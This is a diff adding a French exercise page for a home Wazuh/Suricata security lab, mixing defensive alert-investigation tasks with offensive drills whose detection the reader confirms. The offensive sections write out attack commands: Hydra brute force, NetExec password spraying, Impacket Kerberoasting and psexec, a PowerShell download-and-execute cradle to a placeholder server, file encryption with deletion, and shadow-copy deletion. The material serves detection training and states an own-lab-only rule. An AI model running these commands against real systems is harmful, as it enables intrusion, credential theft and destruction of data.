@@ -1,0 +1,178 @@
+{
+  "title": "Exercices",
+  "subtitle": "44 exercices pratiques construits pour ce laboratoire précis, plus un lot bonus sur la lecture de logs bruts et le recoupement de détections réelles.",
+  "intro": [
+    { "type": "p", "text": "Ce ne sont pas des tutoriels génériques « essayez Wazuh » — chacun cible une capacité réelle, un identifiant de règle réel, ou un vrai bug documenté ailleurs sur ce site. La moitié sont défensifs (lire un tableau de bord, investiguer une alerte), l'autre moitié offensifs (lancer une vraie attaque depuis Kali contre votre propre laboratoire et confirmer la détection)." },
+    { "type": "callout", "variant": "danger", "title": "La règle d'or, sans exception", "text": "Chaque exercice ici ne cible que vos propres machines, sur votre propre réseau autorisé. Jamais un tiers. Jamais une IP publique qui n'est pas la vôtre. Pour les exercices de force brute, toujours utiliser un compte de test jetable avec une poignée de tentatives manuelles — jamais un vrai compte, jamais une liste de mots automatisée contre quoi que ce soit d'important." }
+  ],
+  "toolSetup": {
+    "title": "Configuration des outils, une fois pour toutes (sur la machine Kali)",
+    "code": "sudo apt update\n\n# CrackMapExec / NetExec\nsudo apt install -y netexec\n\n# Impacket (Kerberoasting, psexec, etc.)\nsudo apt install -y impacket-scripts\n\n# Atomic Red Team a besoin de PowerShell sous Linux\nsudo apt install -y powershell\npwsh -Command \"Install-Module -Name powershell-yaml -Force -Scope CurrentUser\"\npwsh -Command \"IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -getAtomics\"\n\n# BloodHound a besoin de sa propre infrastructure — voir l'exercice A-8"
+  },
+  "sections": [
+    {
+      "id": "defensive-warmup",
+      "title": "A. Échauffement tableau de bord",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex1", "title": "Trouver l'alerte la plus récente de victim-linux", "difficulty": "easy", "time": "5 min", "text": "Dans Discover ou Threat Hunting, trouver l'alerte la plus récente de l'agent victim-linux, quelle que soit la règle. Identifier rule.id, rule.level, et résumer en une phrase ce que dit rule.description." },
+        { "id": "ex2", "title": "Compter les alertes critiques du groupe media_isolation", "difficulty": "easy", "time": "5 min", "text": "Combien d'alertes avec rule.level >= 12 et rule.groups:\"media_isolation\" existent dans les dernières 24 heures ? Si zéro, élargir aux 30 derniers jours et rapporter le vrai nombre, plus les horodatages le plus ancien et le plus récent." },
+        { "id": "ex3", "title": "Quelle sonde Suricata parle le plus ?", "difficulty": "easy", "time": "5 min", "text": "Ouvrir le tableau de bord network-security et vérifier le panneau network-alerts-by-sensor. Laquelle des 8 sondes a généré le plus d'alertes dans les 30 derniers jours ? Est-ce attendu, compte tenu du schéma d'usage de chaque machine ?" }
+      ]
+    },
+    {
+      "id": "defensive-network",
+      "title": "B. Détection réseau (Suricata)",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex4", "title": "Scan Nmap contre victim-linux", "difficulty": "easy", "time": "10 min", "tools": ["nmap"], "text": "Depuis kali-vm, lancer nmap -Pn contre la vraie IP de victim-linux. Confirmer sur le tableau de bord network-security si le scan est apparu, et sur quelle sonde. S'il n'apparaît nulle part, expliquer pourquoi en utilisant les leçons SPAN/boucle locale de la page Wazuh." },
+        { "id": "ex5", "title": "Simuler un scan SSH détectable", "difficulty": "medium", "time": "15 min", "text": "Générer du trafic qui déclenche la signature ET SCAN Potential SSH Scan OUTBOUND — plusieurs tentatives de connexion rapides sur le port 22. Trouver l'alerte dans Discover et rapporter data.src_ip, data.dest_ip, et rule.firedtimes." },
+        { "id": "ex6", "title": "Le même événement, vu par deux sondes", "difficulty": "medium", "time": "15 min", "text": "Générer du trafic entre deux machines qui exécutent toutes deux Suricata. Trouver les deux documents générés pour le même événement réseau — un de chaque sonde — et expliquer pourquoi il y a deux enregistrements plutôt qu'un, en utilisant agent.name et data.flow_id." },
+        { "id": "ex7", "title": "L'IP mystère", "difficulty": "easy", "time": "10 min", "text": "Dans le panneau network-top-source-ips, identifier une IP qui ne correspond à aucun des 8 agents connus. Qu'est-ce que c'est probablement ? Confirmer via data.alert.signature." }
+      ]
+    },
+    {
+      "id": "defensive-fim",
+      "title": "C. Intégrité des fichiers / Rançongiciel",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex8", "title": "Déclencher une détection simulée de rançongiciel", "difficulty": "easy", "time": "10 min", "text": "Sur victim-linux, créer 3 à 5 fichiers de test dans /srv/media/ingest, puis tous les renommer en .locked. Confirmer que la règle 100200 s'est déclenchée au niveau 12." },
+        { "id": "ex9", "title": "Confirmer l'isolement, la bascule et le rapport forensique", "difficulty": "medium", "time": "15 min", "text": "Après l'exercice 8, confirmer les trois volets de la réponse automatisée : le déclencheur d'isolement dans active-responses.log, la bascule consignée, et l'existence d'un rapport forensique — avec un incident_id correspondant sur les trois." },
+        { "id": "ex10", "title": "Restaurer et confirmer la réversibilité", "difficulty": "easy", "time": "10 min", "text": "Ramener les fichiers de test de l'exercice 8 à leur état d'origine et confirmer que syscheck ne signale plus d'écart. En une phrase, expliquer pourquoi tester la réversibilité compte pour chaque simulation de cette page." }
+      ]
+    },
+    {
+      "id": "defensive-auth",
+      "title": "D. Authentification et privilèges",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex11", "title": "Échec de connexion SSH, trois fois", "difficulty": "easy", "time": "10 min", "text": "Avec un compte de test jetable, tenter une connexion SSH avec le mauvais mot de passe trois fois. Trouver les trois alertes correspondantes et vérifier si rule.level a augmenté de la première à la troisième tentative." },
+        { "id": "ex12", "title": "Commande sudo inhabituelle et cartographie MITRE", "difficulty": "easy", "time": "10 min", "mitre": ["T1548.003"], "text": "Exécuter une commande comme sudo -u autreutilisateur whoami sur une machine Linux. Trouver l'alerte (règle 5407) et confirmer que rule.mitre.id affiche T1548.003. Expliquer ce que signifie cette technique, en une phrase." }
+      ]
+    },
+    {
+      "id": "defensive-windows",
+      "title": "E. Windows et Active Directory",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex13", "title": "Créer un utilisateur AD et voir si Wazuh l'a remarqué", "difficulty": "medium", "time": "15 min", "text": "Sur win-server-vm, créer un nouvel utilisateur AD via ADUC ou New-ADUser. Chercher un événement correspondant (typiquement Event ID 4720). Si rien n'est trouvé, c'est aussi un résultat valide — investiguer pourquoi l'audit AD n'est pas activé." },
+        { "id": "ex14", "title": "Connexion au domaine avec le mauvais mot de passe", "difficulty": "medium", "time": "10 min", "text": "Avec l'un des utilisateurs de test du domaine existants, tenter une connexion avec le mauvais mot de passe. Chercher un événement d'échec de connexion (Event ID 4625) sur win-server-vm et rapporter s'il est apparu." },
+        { "id": "ex15", "title": "Commande PowerShell inhabituelle sur win10-vm", "difficulty": "easy", "time": "10 min", "text": "Exécuter une commande PowerShell encodée (powershell -enc <base64>). Trouver l'événement et identifier quel champ montre que la commande était obfusquée en Base64." }
+      ]
+    },
+    {
+      "id": "defensive-cve",
+      "title": "F. Gestion des vulnérabilités",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex16", "title": "Traiter une CVE depuis zéro, correctement", "difficulty": "medium", "time": "20 min", "text": "Choisir une CVE Critique/Élevée pas encore documentée sur la page Gestion des CVE. Suivre le flux complet : lire la description, vérifier le tracker de l'éditeur, évaluer si le composant est réellement utilisé, décider correction/atténuation/acceptation, et documenter." },
+        { "id": "ex17", "title": "Traquer un faux positif issu d'un rapport de version obsolète", "difficulty": "hard", "time": "20 min", "text": "Vérifier si une CVE de noyau listée pointe vers une version différente de ce que uname -r montre réellement en cours d'exécution — un noyau orphelin, exactement comme le cas CVE-2026-31536. Si trouvé, redémarrer l'agent et confirmer la resynchronisation." }
+      ]
+    },
+    {
+      "id": "defensive-dashboards",
+      "title": "G. Tableaux de bord et automatisation",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex18", "title": "Construire un nouveau tableau de bord depuis zéro", "difficulty": "medium", "time": "30 min", "text": "Choisir un domaine sans tableau de bord propre encore — win-server-vm/AD, ou l'authentification PAM/sudo sur toutes les machines. Construire au moins 3 visualisations (un Metric, un Line ou Table, un Pie) et un tableau de bord nommé." },
+        { "id": "ex19", "title": "Configurer un vrai moniteur Alerting", "difficulty": "medium", "time": "20 min", "text": "Créer un moniteur vérifiant toutes les 5 minutes plus de 3 alertes réseau non-bruit. Configurer un déclencheur de niveau 2 et le relier à un canal Notifications. Relancer l'exercice 5 et confirmer que le moniteur se déclenche." },
+        { "id": "ex20", "title": "Générer un rapport PDF du tableau de bord réseau", "difficulty": "easy", "time": "10 min", "text": "Générer un rapport PDF du tableau de bord network-security couvrant les 7 derniers jours. Confirmer que le PDF correspond à ce qui est affiché à l'écran." }
+      ]
+    },
+    {
+      "id": "defensive-advanced",
+      "title": "H. Investigation multi-sondes (avancé)",
+      "kind": "defensive",
+      "items": [
+        { "id": "ex21", "title": "Reconstituer la chronologie d'un vrai incident", "difficulty": "hard", "time": "30 min", "text": "Choisir un vrai événement réseau déjà généré dans ce laboratoire. Reconstituer la chronologie complète : machine d'origine, quelles sondes l'ont vu, dans quel ordre, et temps écoulé entre le premier et le dernier document." },
+        { "id": "ex22", "title": "Investiguer la fuite de la règle d'atténuation", "difficulty": "hard", "time": "30 min", "text": "La règle 100101 est documentée comme ne capturant pas 100% de la signature bruyante qu'elle cible. Investiguer local_rules.xml, comprendre la condition exacte, et proposer une correction qui comble l'écart." }
+      ]
+    },
+    {
+      "id": "offensive-recon",
+      "title": "I. Reconnaissance avancée (Nmap)",
+      "kind": "offensive",
+      "items": [
+        { "id": "at1", "title": "Découverte d'hôtes sur tout le sous-réseau", "mitre": ["T1046"], "tools": ["Nmap"], "risk": "low", "code": "nmap -sn 192.168.178.0/24", "text": "Confirmer un pic de trafic ICMP/ARP depuis kali-vm sur toutes les sondes simultanément — la signature d'un balayage complet plutôt qu'un scan à cible unique." },
+        { "id": "at2", "title": "Scan TCP complet (les 65535 ports)", "mitre": ["T1046"], "tools": ["Nmap"], "risk": "low", "code": "nmap -p- -T4 192.168.178.177", "text": "Comparer au scan standard d'environ 1000 ports déjà effectué — celui-ci prend bien plus de temps et devrait générer un volume d'alertes plus important. Rapporter la durée." },
+        { "id": "at3", "title": "Détection de version de service et d'OS", "mitre": ["T1592"], "tools": ["Nmap"], "risk": "low", "code": "sudo nmap -sV -O 192.168.178.177", "text": "Ce scan envoie exprès des paquets malformés pour identifier l'OS. Vérifier une signature différente de l'alerte de scan générique." },
+        { "id": "at4", "title": "Scan de scripts de vulnérabilité (NSE)", "mitre": ["T1595.002"], "tools": ["Nmap"], "risk": "medium", "code": "nmap --script vuln 192.168.178.177", "text": "Le scan le plus agressif de Nmap — teste activement des vulnérabilités connues. Confirmer un volume d'alertes visiblement plus élevé, et comparer les propres résultats de Nmap avec le module Vulnerability Detection de Wazuh — ce sont des sources de données différentes, pas toujours d'accord." }
+      ]
+    },
+    {
+      "id": "offensive-bruteforce",
+      "title": "J. Force brute d'identifiants",
+      "kind": "offensive",
+      "items": [
+        { "id": "at5", "title": "Force brute SSH avec Hydra", "mitre": ["T1110.001"], "tools": ["Hydra"], "risk": "medium", "code": "echo -e \"pass1\\npass2\\nwrongpass\\n123456\" > /tmp/wordlist.txt\nhydra -l test-account -P /tmp/wordlist.txt ssh://192.168.178.177", "text": "Préparation : créer un compte de test jetable au préalable — jamais un vrai compte. Trouver les alertes PAM authentication_failed répétées en séquence rapide — ce motif distingue une faute de frappe humaine d'un outil automatisé." },
+        { "id": "at6", "title": "Force brute RDP contre Windows", "mitre": ["T1110.001"], "tools": ["Hydra"], "risk": "medium", "code": "hydra -l test-account -P /tmp/wordlist.txt rdp://192.168.178.129", "text": "Chercher des événements d'échec de connexion répétés (Event ID 4625) sur win10-vm, et confirmer que Suricata a aussi capturé le motif de trafic RDP répété sur le port 3389." },
+        { "id": "at7", "title": "Password spraying contre Active Directory", "mitre": ["T1110.003"], "tools": ["NetExec"], "risk": "high", "code": "netexec smb 192.168.178.163 -u users.txt -p 'MotDePasseCommun123' --continue-on-success", "text": "Contrairement à la force brute, le spraying essaie un seul mot de passe contre de nombreux comptes spécifiquement pour éviter les verrouillages. Vérifier d'abord la politique de verrouillage du domaine (net accounts /domain). Chercher des événements 4625 répétés depuis la même source contre des comptes différents — le motif qui distingue le spraying de la force brute." }
+      ]
+    },
+    {
+      "id": "offensive-ad",
+      "title": "K. Active Directory",
+      "kind": "offensive",
+      "items": [
+        { "id": "at8", "title": "Énumération des utilisateurs et partages SMB", "mitre": ["T1087.002"], "tools": ["NetExec"], "risk": "low", "code": "netexec smb 192.168.178.163 -u 'test-user' -p 'test-pass' --users\nnetexec smb 192.168.178.163 -u 'test-user' -p 'test-pass' --shares", "text": "Trouver le trafic SMB (port 445) dans Suricata, et si l'audit AD est activé, chercher les événements d'accès aux objets correspondants." },
+        { "id": "at9", "title": "Kerberoasting — extraction de tickets de service", "mitre": ["T1558.003"], "tools": ["Impacket"], "risk": "medium", "code": "impacket-GetUserSPNs domain/test-user:test-pass -dc-ip 192.168.178.163 -request", "text": "Ne fonctionne que si un compte de service avec un SPN enregistré existe — un résultat vide est un résultat valide. Si un ticket revient, chercher l'Event 4769 avec un type de chiffrement faible." },
+        { "id": "at10", "title": "Mouvement latéral via SMB (façon psexec)", "mitre": ["T1021.002"], "tools": ["Impacket"], "risk": "high", "code": "impacket-psexec domain/test-user:test-pass@192.168.178.163", "text": "Une vraie technique de mouvement latéral via un service distant temporaire. N'utiliser que le compte de test. Chercher la création de service (Event ID 7045) juste avant l'exécution distante — la preuve classique recherchée par un analyste SOC." },
+        { "id": "at11", "title": "Cartographier les chemins d'attaque avec BloodHound", "mitre": ["T1482"], "tools": ["BloodHound"], "risk": "low", "code": "sudo apt install -y bloodhound neo4j\nsudo neo4j start\nbloodhound-python -u test-user -p test-pass -d domain.local -ns 192.168.178.163 -c all", "text": "Reconnaissance/analyse, pas exploitation. Explorer le graphe importé à la recherche d'un chemin d'un utilisateur normal vers les Domain Admins. « Aucun chemin évident » est aussi un résultat valable et documentable." }
+      ]
+    },
+    {
+      "id": "offensive-exploitation",
+      "title": "L. Exploitation (Metasploit)",
+      "kind": "offensive",
+      "items": [
+        { "id": "at12", "title": "Scanner auxiliaire de version de service", "mitre": ["T1592"], "tools": ["Metasploit"], "risk": "low", "code": "msfconsole -q -x \"use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.178.163; run; exit\"", "text": "Les modules auxiliary/scanner/* sont de la reconnaissance, pas de l'exploitation — le point de départ sûr avant tout véritable exploit. Confirmer que le trafic est apparu dans le Suricata de la cible." },
+        { "id": "at13", "title": "Exploiter une CVE que vous avez identifiée vous-même", "mitre": ["T1190"], "tools": ["Metasploit"], "risk": "high", "text": "Chercher dans vos propres découvertes de Vulnerability Detection une CVE documentée avec un vrai module Metasploit (search cve:ANNÉE-NUMÉRO). Faire un instantané de la VM d'abord. Si aucune n'est trouvée exploitable, c'est le résultat attendu — et à documenter — dans la plupart des cas." }
+      ]
+    },
+    {
+      "id": "offensive-lolbins",
+      "title": "M. Living off the Land (Windows)",
+      "kind": "offensive",
+      "items": [
+        { "id": "at14", "title": "certutil comme téléchargeur/décodeur déguisé", "mitre": ["T1140"], "risk": "low", "code": "certutil -encode file.txt file.b64\ncertutil -decode file.b64 out.txt", "text": "Trouver l'Event ID 1 de Sysmon montrant certutil.exe avec le paramètre -decode — un vrai motif utilisé par les attaquants puisque certutil est un binaire légitime, signé par Microsoft." },
+        { "id": "at15", "title": "Chaîne de téléchargement PowerShell", "mitre": ["T1059.001"], "risk": "medium", "code": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://VOTRE-SERVEUR:8000/test.ps1')\"", "text": "La classique « chaîne de téléchargement » — récupérer et exécuter en mémoire sans enregistrer sur disque. Trouver l'événement Sysmon et confirmer que la ligne de commande complète est lisible, non obfusquée." },
+        { "id": "at16", "title": "Découverte de comptes locaux via des commandes natives", "mitre": ["T1087.001"], "risk": "low", "code": "net user\nnet localgroup administrators\nwhoami /priv", "text": "Chaque commande semble inoffensive isolément — mais la séquence (lister les utilisateurs, lister les admins, vérifier ses propres privilèges) est un motif de reconnaissance post-exploitation. Expliquer pourquoi la séquence compte plus que n'importe quelle commande isolée en triage réel." }
+      ]
+    },
+    {
+      "id": "offensive-atomic",
+      "title": "N. Atomic Red Team (MITRE ATT&CK)",
+      "kind": "offensive",
+      "items": [
+        { "id": "at17", "title": "T1059.001 — Exécution PowerShell suspecte", "mitre": ["T1059.001"], "tools": ["Atomic Red Team"], "risk": "low", "code": "Invoke-AtomicTest T1059.001 -ShowDetailsBrief\nInvoke-AtomicTest T1059.001", "text": "Confirmer l'événement Sysmon résultant et que le champ de technique MITRE correspond à ce que le framework a annoncé." },
+        { "id": "at18", "title": "T1003 — Simulation d'accès aux identifiants", "mitre": ["T1003"], "tools": ["Atomic Red Team"], "risk": "medium", "code": "Invoke-AtomicTest T1003", "text": "Simule le motif de comportement façon Mimikatz (accès au processus LSASS) en toute sécurité, sans extraire de vrais identifiants. Vérifier un événement d'accès au processus sur lsass.exe." },
+        { "id": "at19", "title": "T1547 — Persistance via clé de registre de démarrage", "mitre": ["T1547.001"], "tools": ["Atomic Red Team"], "risk": "medium", "code": "Invoke-AtomicTest T1547.001\n# toujours nettoyer après avoir confirmé la détection :\nInvoke-AtomicTest T1547.001 -Cleanup", "text": "Trouver l'événement de modification de registre sur la clé Run/RunOnce, puis confirmer que -Cleanup a bien supprimé l'entrée." },
+        { "id": "at20", "title": "T1078 — Utilisation d'un compte valide à une heure inhabituelle", "mitre": ["T1078"], "risk": "low", "text": "Aucun outil spécial nécessaire : se connecter à un compte de test du domaine en dehors des heures de bureau. Appliquer le même raisonnement que les cas de formation « le poste disparaît » et « alerte à 3h du matin » — un horaire inhabituel est un facteur aggravant même avec des identifiants valides." }
+      ]
+    },
+    {
+      "id": "offensive-ransomware",
+      "title": "O. Rançongiciel avancé",
+      "kind": "offensive",
+      "items": [
+        { "id": "at21", "title": "Chiffrement réel de fichiers de test", "mitre": ["T1486"], "tools": ["OpenSSL"], "risk": "medium", "code": "tar -czf ~/backup-pre-test.tar.gz -C /srv/media/ingest .\nfor f in /srv/media/ingest/test-*.txt; do\n  openssl enc -aes-256-cbc -salt -in \"$f\" -out \"$f.enc\" -k \"cle-de-test\"\n  sudo rm \"$f\"\ndone", "text": "Contrairement à un simple renommage, ceci rend réellement le contenu illisible — plus proche du comportement réel d'un rançongiciel. Confirmer que la règle 100200 se déclenche à la fois pour la suppression et pour le nouveau fichier .enc, et que la Réponse Active isole le nœud normalement." },
+        { "id": "at22", "title": "Suppression des clichés instantanés (anti-récupération)", "mitre": ["T1490"], "tools": ["vssadmin"], "risk": "high", "code": "vssadmin delete shadows /all /quiet", "text": "Faire un instantané de la VM avant d'exécuter ceci — il n'y a pas de retour en arrière. C'est littéralement ce que font tourner les vraies familles de rançongiciels pour empêcher la récupération. À elle seule, sans autre contexte, cette commande devrait déjà être traitée comme un indicateur critique. Votre environnement a-t-il une règle spécifique pour cela ? Sinon, c'est un vrai manque à documenter." }
+      ]
+    },
+    {
+      "id": "bonus-realworld",
+      "title": "P. Lire de vrais logs et recouper les détections (bonus)",
+      "kind": "bonus",
+      "intro": "Au-delà des 44 exercices structurés ci-dessus : la compétence qui distingue vraiment un analyste junior d'un analyste senior, c'est de lire les données brutes directement, sans attendre qu'un tableau de bord les résume — et de confirmer que différents outils regardant le même événement sont réellement d'accord.",
+      "items": [
+        { "id": "log1", "title": "Lire une ligne brute d'eve.json Suricata, sans tableau de bord", "difficulty": "medium", "time": "15 min", "text": "Se connecter en SSH à une machine exécutant Suricata et faire tail -f /var/log/suricata/eve.json (ou le chemin équivalent selon la plateforme) tout en générant du trafic depuis une autre machine. Identifier les champs alert.signature, src_ip, dest_ip et flow_id directement dans le JSON brut, avant qu'il n'atteigne jamais l'index de Wazuh." },
+        { "id": "log2", "title": "Recouper un vrai scan externe contre votre IP publique", "difficulty": "hard", "time": "20 min", "text": "Ce laboratoire a connu une alerte ET SCAN Potential SSH Scan OUTBOUND authentique (pas simulée) déclenchée depuis kali-vm pendant les tests, avec un firedtimes dépassant 180 en quelques minutes et zéro réponse de la destination. Reproduire une investigation similaire : trouver une vraie alerte de scan sortant dans votre propre environnement, et déterminer à partir de bytes_toclient (ou de son absence) si la cible a réellement répondu — un vrai signal de posture de sécurité, pas juste un enregistrement de scan." },
+        { "id": "log3", "title": "Reconstituer un événement à partir de full_log seul", "difficulty": "medium", "time": "15 min", "text": "Choisir n'importe quelle alerte et ignorer tous les champs structurés sauf full_log. Reconstituer, en langage clair, exactement ce qui s'est passé en utilisant uniquement la ligne de log brute — la compétence nécessaire pour le cas (courant, réel) où un format de log n'a pas encore de décodeur dédié." },
+        { "id": "log4", "title": "Construire une « ligne de base calme » sur 24 heures", "difficulty": "medium", "time": "30 min (étalé sur une journée)", "text": "Choisir un agent et consigner, heure par heure, à quoi ressemble une journée d'alertes complètement normale : volume, signatures les plus fréquentes, niveaux de règle typiques. Cette ligne de base est ce qui rend une véritable anomalie reconnaissable plus tard — sans elle, chaque alerte semble aussi suspecte que les autres." },
+        { "id": "log5", "title": "Comparer le propre résultat d'un outil de scan avec ce qui a été détecté", "difficulty": "medium", "time": "15 min", "text": "Lancer n'importe quel scan de cette page avec des options verbeuses/fichier de sortie (par ex. nmap -oA), puis comparer le propre rapport de l'outil sur ce qu'il a fait avec ce que Wazuh/Suricata ont réellement journalisé. Sont-ils identiques ? Si Wazuh a vu moins d'événements que ce que l'outil a réellement envoyé, c'est un vrai écart de couverture de détection à comprendre, pas juste une divergence à ignorer." },
+        { "id": "log6", "title": "Lire les logs auditd directement avec ausearch", "difficulty": "medium", "time": "15 min", "text": "Sur un point de terminaison Linux, déclencher une règle auditd (par ex. éditer /etc/passwd, ou tenter une commande privilégiée) et lire le résultat avec ausearch -k <clé> directement sur l'hôte, avant qu'il ne soit analysé par le décodeur de Wazuh. Comparer les champs d'audit bruts à ce qui finit dans l'alerte Wazuh — qu'est-ce qui est conservé, et qu'est-ce qui est abandonné ?" },
+        { "id": "log7", "title": "Suivre un incident à travers trois outils", "difficulty": "hard", "time": "30 min", "text": "Choisir une alerte de niveau 7 ou plus. La trouver à trois endroits : l'alerte Wazuh brute (Discover), l'alerte TheHive qu'elle a générée automatiquement, et — si vous la promouvez — le cas qui en résulte. Confirmer que l'incident raconte exactement la même histoire aux trois endroits, et noter tout ce qui aurait été perdu ou modifié dans la traduction entre eux." }
+      ]
+    }
+  ]
+}
